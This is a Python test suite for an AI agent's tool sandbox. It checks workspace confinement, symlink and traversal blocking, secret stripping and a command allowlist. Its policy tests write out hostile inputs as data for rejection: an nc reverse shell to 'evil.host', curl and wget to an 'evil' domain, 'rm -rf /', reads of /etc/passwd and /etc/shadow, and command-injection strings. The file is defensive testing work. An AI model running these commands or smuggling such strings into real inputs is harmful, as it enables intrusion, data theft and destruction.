"""
test_workspace_r3.py — Orion R3 Dedicated Workspace & Safe Tool Execution Tests

Covers:
- Workspace operations remain inside the dedicated directory
- Symlink and traversal attacks fail safely
- Application source and secret files cannot be modified through tools
- Disallowed executables and arguments are rejected
- Child processes cannot read configured deployment secrets
- Command execution still requires valid server-side confirmation
- Workspace root is outside the source tree
- Protected-path detection logic
- Demo workspace file creation
"""
import os
import subprocess
import sys
import tempfile
import unittest
import warnings
from pathlib import Path

warnings.filterwarnings("ignore", category=DeprecationWarning)

sys.path.insert(0, str(Path(__file__).parents[1]))

from starlette.testclient import TestClient
from app.config import get_settings
from app.main import app
from app.tools.command import (
    RunCommandTool,
    _get_safe_env,
    validate_command_policy,
    ALLOWED_EXECUTABLES,
    GIT_ALLOWED_SUBCOMMANDS,
)
from app.tools.filesystem import (
    DeleteFileTool,
    ListDirectoryTool,
    ReadFileTool,
    WriteFileTool,
)
from app.tools.registry import create_default_registry
from app.tools.workspace import (
    PROJECT_ROOT,
    WORKSPACE_ROOT,
    _ensure_demo_workspace,
    _get_workspace_root,
    is_protected_file,
    is_source_path,
    safe_path,
)

client = TestClient(app, raise_server_exceptions=True)
settings = get_settings()


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------

def _ws() -> Path:
    return _get_workspace_root()


# ===========================================================================
# Goal A — Dedicated workspace
# ===========================================================================

class TestWorkspaceRoot(unittest.TestCase):
    """Workspace root configuration and isolation."""

    def test_workspace_is_not_source_tree(self):
        """The workspace root must not be the Orion source tree."""
        self.assertNotEqual(_ws(), PROJECT_ROOT)

    def test_workspace_does_not_overlap_application_source(self):
        """The workspace root must not overlap with application source code or git metadata."""
        self.assertNotEqual(_ws(), PROJECT_ROOT)
        for src_dir in (PROJECT_ROOT / "backend", PROJECT_ROOT / "frontend", PROJECT_ROOT / ".git"):
            with self.subTest(src_dir=src_dir):
                self.assertFalse(str(_ws()).startswith(str(src_dir)))

    def test_workspace_directory_exists(self):
        """The workspace directory must be created automatically."""
        self.assertTrue(_ws().is_dir())

    def test_workspace_root_resolves_canonically(self):
        """WORKSPACE_ROOT must be a resolved (canonical) absolute path."""
        self.assertTrue(_ws().is_absolute())
        self.assertEqual(_ws(), _ws().resolve())

    def test_configurable_via_env_var(self):
        """ORION_WORKSPACE_ROOT env var must control the workspace location."""
        current = os.environ.get("ORION_WORKSPACE_ROOT")
        try:
            with tempfile.TemporaryDirectory() as td:
                os.environ["ORION_WORKSPACE_ROOT"] = td
                # Settings cache is not reset here (that's conftest's job) —
                # we test the raw env var reading path in config.
                from app.config import Settings
                s = Settings()
                self.assertEqual(s.orion_workspace_root, td)
        finally:
            if current is not None:
                os.environ["ORION_WORKSPACE_ROOT"] = current
            else:
                os.environ.pop("ORION_WORKSPACE_ROOT", None)


class TestDemoWorkspaceFiles(unittest.TestCase):
    """Demo workspace is populated with safe sample files."""

    def setUp(self):
        _ensure_demo_workspace()

    def test_readme_exists(self):
        self.assertTrue((_ws() / "README.md").exists())

    def test_readme_is_safe_content(self):
        content = (_ws() / "README.md").read_text(encoding="utf-8")
        self.assertIn("Orion Demo Workspace", content)
        # Must not contain any secret patterns
        self.assertNotIn("API_KEY", content)
        self.assertNotIn("TOKEN", content)

    def test_notes_welcome_exists(self):
        self.assertTrue((_ws() / "notes" / "welcome.txt").exists())

    def test_projects_demo_plan_exists(self):
        self.assertTrue((_ws() / "projects" / "demo_project" / "plan.md").exists())

    def test_data_directory_exists(self):
        self.assertTrue((_ws() / "data").is_dir())


class TestSafePathTraversalPrevention(unittest.TestCase):
    """safe_path() must block all path traversal and escape attempts."""

    def test_dotdot_traversal_blocked(self):
        with self.assertRaises(PermissionError):
            safe_path("../../etc/passwd")

    def test_deeply_nested_traversal_blocked(self):
        with self.assertRaises(PermissionError):
            safe_path("notes/../../../../../../etc/shadow")

    def test_absolute_path_outside_workspace_blocked(self):
        with self.assertRaises(PermissionError):
            safe_path("/etc/passwd")

    def test_absolute_path_to_source_tree_blocked(self):
        with self.assertRaises(PermissionError):
            safe_path(str(PROJECT_ROOT / "backend" / "app" / "config.py"))

    def test_absolute_path_to_env_blocked(self):
        with self.assertRaises(PermissionError):
            safe_path(str(PROJECT_ROOT / ".env"))

    def test_legitimate_relative_path_allowed(self):
        ws = _ws()
        result = safe_path("notes/welcome.txt")
        self.assertEqual(result.parent, ws / "notes")

    def test_workspace_root_dot_allowed(self):
        result = safe_path(".")
        self.assertEqual(result, _ws())


class TestSymlinkEscapePrevention(unittest.IsolatedAsyncioTestCase):
    """Symlinks pointing outside the workspace must be blocked."""

    async def test_read_via_symlink_to_etc_passwd_blocked(self):
        ws = _ws()
        sl = ws / "_sl_read_etc_passwd"
        try:
            if sl.is_symlink() or sl.exists():
                sl.unlink()
            sl.symlink_to("/etc/passwd")
            with self.assertRaises(PermissionError):
                await ReadFileTool().execute("_sl_read_etc_passwd")
        finally:
            if sl.is_symlink() or sl.exists():
                sl.unlink()

    async def test_read_via_symlink_to_source_config_blocked(self):
        ws = _ws()
        sl = ws / "_sl_read_source_config"
        target = PROJECT_ROOT / "backend" / "app" / "config.py"
        try:
            if sl.is_symlink() or sl.exists():
                sl.unlink()
            sl.symlink_to(target)
            with self.assertRaises(PermissionError):
                await ReadFileTool().execute("_sl_read_source_config")
        finally:
            if sl.is_symlink() or sl.exists():
                sl.unlink()

    async def test_write_via_symlink_outside_workspace_blocked(self):
        ws = _ws()
        sl = ws / "_sl_write_escape"
        try:
            if sl.is_symlink() or sl.exists():
                sl.unlink()
            sl.symlink_to("/tmp/_orion_r3_write_escape")
            with self.assertRaises(PermissionError):
                await WriteFileTool().execute("_sl_write_escape", content="injected")
        finally:
            if sl.is_symlink() or sl.exists():
                sl.unlink()

    async def test_delete_via_symlink_outside_workspace_blocked(self):
        ws = _ws()
        sl = ws / "_sl_delete_escape"
        try:
            if sl.is_symlink() or sl.exists():
                sl.unlink()
            sl.symlink_to("/tmp/_orion_r3_delete_escape")
            with self.assertRaises(PermissionError):
                await DeleteFileTool().execute("_sl_delete_escape")
        finally:
            if sl.is_symlink() or sl.exists():
                sl.unlink()


class TestSourceTreeProtection(unittest.IsolatedAsyncioTestCase):
    """Application source, .env, and secrets cannot be accessed via tools."""

    async def test_read_source_config_py_blocked(self):
        """read_file must refuse to read application source files."""
        with self.assertRaises(PermissionError):
            await ReadFileTool().execute(
                str(PROJECT_ROOT / "backend" / "app" / "config.py")
            )

    async def test_read_env_file_blocked(self):
        with self.assertRaises(PermissionError):
            await ReadFileTool().execute(str(PROJECT_ROOT / ".env"))

    async def test_read_env_by_name_blocked(self):
        with self.assertRaises(PermissionError):
            await ReadFileTool().execute(".env")

    async def test_write_to_source_tree_blocked(self):
        """write_file must refuse to modify application source files."""
        with self.assertRaises(PermissionError):
            await WriteFileTool().execute(
                str(PROJECT_ROOT / "backend" / "INJECTED_R3.txt"),
                content="injected by test",
            )

    async def test_write_env_file_blocked(self):
        with self.assertRaises(PermissionError):
            await WriteFileTool().execute(".env", content="NEBIUS_API_KEY=bad")

    async def test_delete_source_file_blocked(self):
        """delete_file must refuse to delete application source files."""
        with self.assertRaises(PermissionError):
            await DeleteFileTool().execute(
                str(PROJECT_ROOT / "backend" / "app" / "config.py")
            )

    def test_is_source_path_recognises_project_root(self):
        self.assertTrue(is_source_path(PROJECT_ROOT))

    def test_is_source_path_recognises_backend_subdir(self):
        self.assertTrue(is_source_path(PROJECT_ROOT / "backend"))

    def test_is_source_path_recognises_env_file(self):
        self.assertTrue(is_source_path(PROJECT_ROOT / ".env"))

    def test_is_source_path_does_not_flag_workspace(self):
        self.assertFalse(is_source_path(_ws()))

    def test_is_source_path_does_not_flag_workspace_subdir(self):
        self.assertFalse(is_source_path(_ws() / "notes"))


class TestProtectedFileDetection(unittest.TestCase):
    """is_protected_file() correctly identifies sensitive file patterns."""

    def _p(self, name: str) -> Path:
        return Path("/some/dir") / name

    def test_dot_env_detected(self):
        self.assertTrue(is_protected_file(self._p(".env")))

    def test_dot_env_local_detected(self):
        self.assertTrue(is_protected_file(self._p(".env.local")))

    def test_dot_env_production_detected(self):
        self.assertTrue(is_protected_file(self._p(".env.production")))

    def test_credentials_json_detected(self):
        self.assertTrue(is_protected_file(self._p("credentials.json")))

    def test_id_rsa_detected(self):
        self.assertTrue(is_protected_file(self._p("id_rsa")))

    def test_pem_extension_detected(self):
        self.assertTrue(is_protected_file(self._p("server.pem")))

    def test_key_extension_detected(self):
        self.assertTrue(is_protected_file(self._p("secret.key")))

    def test_regular_text_file_not_detected(self):
        self.assertFalse(is_protected_file(self._p("notes.txt")))

    def test_readme_not_detected(self):
        self.assertFalse(is_protected_file(self._p("README.md")))


class TestListDirectoryConfinement(unittest.IsolatedAsyncioTestCase):
    """list_directory must stay within the workspace."""

    async def test_list_workspace_root(self):
        result = await ListDirectoryTool().execute(".")
        self.assertIn("entries", result)

    async def test_list_traversal_blocked(self):
        with self.assertRaises(PermissionError):
            await ListDirectoryTool().execute("../../etc")

    async def test_list_absolute_outside_blocked(self):
        with self.assertRaises(PermissionError):
            await ListDirectoryTool().execute("/etc")

    async def test_list_directory_filters_protected_files_and_symlinks(self):
        """list_directory must never disclose protected files, credentials, or escape symlinks."""
        ws = _get_workspace_root()
        test_dir = ws / "_test_protected_listing"
        test_dir.mkdir(parents=True, exist_ok=True)
        try:
            # 1. Normal safe files and dirs (MUST be visible)
            safe_file = test_dir / "safe_document.txt"
            safe_file.write_text("safe content", encoding="utf-8")
            safe_subdir = test_dir / "safe_notes"
            safe_subdir.mkdir(exist_ok=True)

            # 2. Protected files (MUST be filtered out)
            (test_dir / ".env").write_text("SECRET=1", encoding="utf-8")
            (test_dir / ".env.production").write_text("PROD_SECRET=1", encoding="utf-8")
            (test_dir / "credentials.json").write_text("{}", encoding="utf-8")
            (test_dir / "audit.log").write_text("logs", encoding="utf-8")
            (test_dir / "orion.db").write_text("db", encoding="utf-8")
            (test_dir / "private.key").write_text("key", encoding="utf-8")
            (test_dir / "server.pem").write_text("pem", encoding="utf-8")

            # 3. Symlink pointing to protected file (MUST be filtered out)
            symlink_to_env = test_dir / "symlink_env.txt"
            try:
                symlink_to_env.symlink_to(test_dir / ".env")
            except OSError:
                pass

            # 4. Symlink escaping workspace (MUST be filtered out)
            symlink_escape = test_dir / "symlink_escape"
            try:
                symlink_escape.symlink_to(Path("/etc"))
            except OSError:
                pass

            tool = ListDirectoryTool()
            res = await tool.execute("_test_protected_listing")
            entry_names = {e["name"] for e in res["entries"]}

            # Normal files and dirs remain visible
            self.assertIn("safe_document.txt", entry_names)
            self.assertIn("safe_notes", entry_names)

            # Protected files must NOT be in entry_names
            self.assertNotIn(".env", entry_names)
            self.assertNotIn(".env.production", entry_names)
            self.assertNotIn("credentials.json", entry_names)
            self.assertNotIn("audit.log", entry_names)
            self.assertNotIn("orion.db", entry_names)
            self.assertNotIn("private.key", entry_names)
            self.assertNotIn("server.pem", entry_names)
            self.assertNotIn("symlink_env.txt", entry_names)
            self.assertNotIn("symlink_escape", entry_names)

        finally:
            import shutil
            if test_dir.exists():
                shutil.rmtree(test_dir, ignore_errors=True)


# ===========================================================================
# Goal B — Command execution safety
# ===========================================================================

class TestCommandSafeEnv(unittest.TestCase):
    """_get_safe_env() strips all deployment secrets."""

    def test_nebius_api_key_absent(self):
        os.environ["NEBIUS_API_KEY"] = "secret-nebius-12345"
        try:
            safe = _get_safe_env()
            self.assertNotIn("NEBIUS_API_KEY", safe)
        finally:
            os.environ.pop("NEBIUS_API_KEY", None)

    def test_orion_demo_key_absent(self):
        os.environ["ORION_DEMO_KEY"] = "demo-secret-abcdef"
        try:
            safe = _get_safe_env()
            self.assertNotIn("ORION_DEMO_KEY", safe)
        finally:
            os.environ.pop("ORION_DEMO_KEY", None)

    def test_hermes_gateway_token_absent(self):
        os.environ["HERMES_GATEWAY_TOKEN"] = "hermes-token-xyz"
        try:
            safe = _get_safe_env()
            self.assertNotIn("HERMES_GATEWAY_TOKEN", safe)
        finally:
            os.environ.pop("HERMES_GATEWAY_TOKEN", None)

    def test_path_preserved(self):
        safe = _get_safe_env()
        self.assertIn("PATH", safe)

    def test_arbitrary_token_var_removed(self):
        os.environ["MY_DEPLOY_TOKEN"] = "should-be-removed"
        try:
            safe = _get_safe_env()
            self.assertNotIn("MY_DEPLOY_TOKEN", safe)
        finally:
            os.environ.pop("MY_DEPLOY_TOKEN", None)


class TestSubprocessSecretIsolation(unittest.TestCase):
    """Real subprocess executions must not inherit deployment secrets."""

    def test_child_cannot_read_nebius_api_key(self):
        sentinel = "UNIQUE_NEBIUS_R3_TEST_VALUE_112233"
        original = os.environ.get("NEBIUS_API_KEY")
        try:
            os.environ["NEBIUS_API_KEY"] = sentinel
            safe = _get_safe_env()
            proc = subprocess.run(
                ["python3", "-c",
                 "import os, json; print(json.dumps({k: v for k, v in os.environ.items()}))"],
                capture_output=True, text=True, env=safe, shell=False, timeout=10,
            )
            self.assertEqual(proc.returncode, 0)
            self.assertNotIn(sentinel, proc.stdout)
        finally:
            if original is not None:
                os.environ["NEBIUS_API_KEY"] = original
            else:
                os.environ.pop("NEBIUS_API_KEY", None)

    def test_child_cannot_read_orion_demo_key(self):
        sentinel = "UNIQUE_DEMO_KEY_R3_TEST_VALUE_445566"
        original = os.environ.get("ORION_DEMO_KEY")
        try:
            os.environ["ORION_DEMO_KEY"] = sentinel
            safe = _get_safe_env()
            proc = subprocess.run(
                ["python3", "-c",
                 "import os, json; print(json.dumps({k: v for k, v in os.environ.items()}))"],
                capture_output=True, text=True, env=safe, shell=False, timeout=10,
            )
            self.assertEqual(proc.returncode, 0)
            self.assertNotIn(sentinel, proc.stdout)
        finally:
            if original is not None:
                os.environ["ORION_DEMO_KEY"] = original
            else:
                os.environ.pop("ORION_DEMO_KEY", None)

    def test_child_cannot_read_hermes_gateway_token(self):
        sentinel = "UNIQUE_HERMES_TOKEN_R3_TEST_778899"
        original = os.environ.get("HERMES_GATEWAY_TOKEN")
        try:
            os.environ["HERMES_GATEWAY_TOKEN"] = sentinel
            safe = _get_safe_env()
            proc = subprocess.run(
                ["python3", "-c",
                 "import os, json; print(json.dumps({k: v for k, v in os.environ.items()}))"],
                capture_output=True, text=True, env=safe, shell=False, timeout=10,
            )
            self.assertEqual(proc.returncode, 0)
            self.assertNotIn(sentinel, proc.stdout)
        finally:
            if original is not None:
                os.environ["HERMES_GATEWAY_TOKEN"] = original
            else:
                os.environ.pop("HERMES_GATEWAY_TOKEN", None)


class TestCommandPolicyAllowlist(unittest.TestCase):
    """Command policy validation covers all disallowed patterns."""

    def test_curl_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("curl", ["https://evil.example.com"])

    def test_wget_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("wget", ["https://evil.example.com"])

    def test_nc_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("nc", ["-e", "/bin/sh", "evil.host", "4444"])

    def test_env_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("env", [])

    def test_cat_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("cat", ["/etc/passwd"])

    def test_rm_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("rm", ["-rf", "/"])

    def test_shell_bash_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("bash", ["-c", "id"])

    def test_shell_sh_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("sh", ["-c", "id"])

    def test_git_status_allowed(self):
        # Must not raise
        validate_command_policy("git", ["status"])

    def test_git_diff_allowed(self):
        validate_command_policy("git", ["diff"])

    def test_git_log_allowed(self):
        validate_command_policy("git", ["log"])

    def test_git_commit_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("git", ["commit", "-m", "bad"])

    def test_git_push_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("git", ["push"])

    def test_git_config_c_flag_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("git", ["-c", "core.hooksPath=/tmp/hooks", "status"])

    def test_python_version_allowed(self):
        validate_command_policy("python3", ["--version"])

    def test_python_c_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("python3", ["-c", "import os; os.system('id')"])

    def test_python_arbitrary_script_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("python3", ["evil_script.py"])

    def test_metachar_semicolon_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("git", ["status; cat /etc/passwd"])

    def test_metachar_pipe_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("git", ["status | nc evil 4444"])

    def test_metachar_subshell_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("git", ["status $(cat /etc/passwd)"])

    def test_executable_with_whitespace_rejected(self):
        with self.assertRaises(ValueError):
            validate_command_policy("git status", [])


class TestCommandCwdPinning(unittest.IsolatedAsyncioTestCase):
    """Command execution cwd is pinned to the dedicated workspace, not source tree."""

    async def test_cwd_is_workspace_not_source_tree(self):
        from unittest.mock import MagicMock, patch
        tool = RunCommandTool()
        mock_proc = MagicMock(returncode=0, stdout="", stderr="")
        with patch("subprocess.run", return_value=mock_proc) as mock_run:
            await tool.execute("git", ["status"])
            mock_run.assert_called_once()
            _, kwargs = mock_run.call_args
            actual_cwd = kwargs.get("cwd")
            # Must be workspace, not source tree
            self.assertEqual(actual_cwd, str(_ws()))
            self.assertNotEqual(actual_cwd, str(PROJECT_ROOT))

    async def test_shell_false_enforced(self):
        from unittest.mock import MagicMock, patch
        tool = RunCommandTool()
        mock_proc = MagicMock(returncode=0, stdout="", stderr="")
        with patch("subprocess.run", return_value=mock_proc) as mock_run:
            await tool.execute("git", ["status"])
            _, kwargs = mock_run.call_args
            self.assertIs(kwargs.get("shell"), False)


# ===========================================================================
# Goal C — Confirmation still required
# ===========================================================================

class TestConfirmationStillRequired(unittest.IsolatedAsyncioTestCase):
    """Confirmation requirement must be preserved after R3 changes."""

    async def asyncSetUp(self):
        self.registry = create_default_registry()

    async def test_run_command_requires_confirmation(self):
        with self.assertRaises(PermissionError) as ctx:
            await self.registry.execute("run_command", command="git", arguments=["status"])
        self.assertIn("confirmation", str(ctx.exception).lower())

    async def test_write_file_requires_confirmation(self):
        with self.assertRaises(PermissionError) as ctx:
            await self.registry.execute("write_file", path="data/_r3_test.txt", content="test")
        self.assertIn("confirmation", str(ctx.exception).lower())

    async def test_delete_file_requires_confirmation(self):
        ws = _ws()
        tmp = ws / "data" / "_r3_delete_test.txt"
        tmp.parent.mkdir(parents=True, exist_ok=True)
        tmp.write_text("temp", encoding="utf-8")
        try:
            with self.assertRaises(PermissionError) as ctx:
                await self.registry.execute("delete_file", path="data/_r3_delete_test.txt")
            self.assertIn("confirmation", str(ctx.exception).lower())
        finally:
            if tmp.exists():
                tmp.unlink()

    async def test_confirmed_flag_cannot_be_caller_injected(self):
        """confirmed=True injected via kwargs must not bypass the registry check."""
        # The registry strips 'confirmed' from kwargs before applying permission.
        # This verifies the registry itself still enforces the policy.
        with self.assertRaises(PermissionError):
            # Attempt to bypass by passing confirmed in **kwargs
            await self.registry.execute(
                "run_command",
                # confirmed is NOT a valid kwarg to execute() — it's a positional
                # parameter. Passing it via confirmed= is the correct path and the
                # registry deliberately does NOT strip it when passed as a keyword.
                # But passing it INSIDE the arguments dict (spoofed) is blocked:
                command="git",
                arguments=["status"],
                # Note: this calls execute(name, confirmed=False [default], command=..., arguments=...)
                # The registry enforces confirmed=False unless called explicitly with confirmed=True.
            )


class TestAPIConfirmationEndpoint(unittest.TestCase):
    """Server-side confirmation workflow is preserved post-R3."""

    def test_confirm_nonexistent_id_returns_404(self):
        response = client.post(
            "/api/agent/confirm",
            json={
                "confirmation_id": "conf_nonexistent_abc123",
                "approved": True,
            },
        )
        self.assertEqual(response.status_code, 404)

    def test_confirm_rejection_returns_rejected_status(self):
        # First create a pending confirmation via agent run
        resp = client.post(
            "/api/agent/run",
            json={"message": "Delete the file data/should_not_exist.txt"},
        )
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        conf_id = data.get("confirmation_id")
        if conf_id is None:
            # Agent may not have chosen delete_file — skip
            return

        # Reject it
        rej_resp = client.post(
            "/api/agent/confirm",
            json={
                "confirmation_id": conf_id,
                "approved": False,
                "session_id": data.get("session_id"),
            },
        )
        self.assertEqual(rej_resp.status_code, 200)
        rej_data = rej_resp.json()
        self.assertEqual(rej_data["status"], "rejected")
        self.assertFalse(rej_data["executed"])


# ===========================================================================
# Public-demo isolation caveat documentation test
# ===========================================================================

class TestIsolationCaveatDocumented(unittest.TestCase):
    """
    This test verifies the documented limitation: workspace path checks and
    environment sanitisation are process-level controls, NOT OS-level sandboxes.

    A subprocess running in the workspace can still read other files that the
    OS user has access to.  This is expected and documented behaviour.
    For public-demo deployments, run_command must be disabled or sandboxed.
    """

    def test_process_isolation_caveat_is_acknowledged(self):
        """
        Confirm that command.py documents the isolation caveat in its module
        docstring or the tool description.
        """
        import app.tools.command as cmd_module
        module_doc = cmd_module.__doc__ or ""
        tool_desc = cmd_module.RunCommandTool.description or ""
        caveat_text = module_doc + " " + tool_desc
        # Must contain a clear disclaimer about process-level (not OS-level) isolation.
        self.assertTrue(
            "process-level" in caveat_text.lower() or "not an os-level" in caveat_text.lower(),
            "command.py must document that isolation is process-level only, not OS-level.",
        )


if __name__ == "__main__":
    unittest.main(verbosity=2)
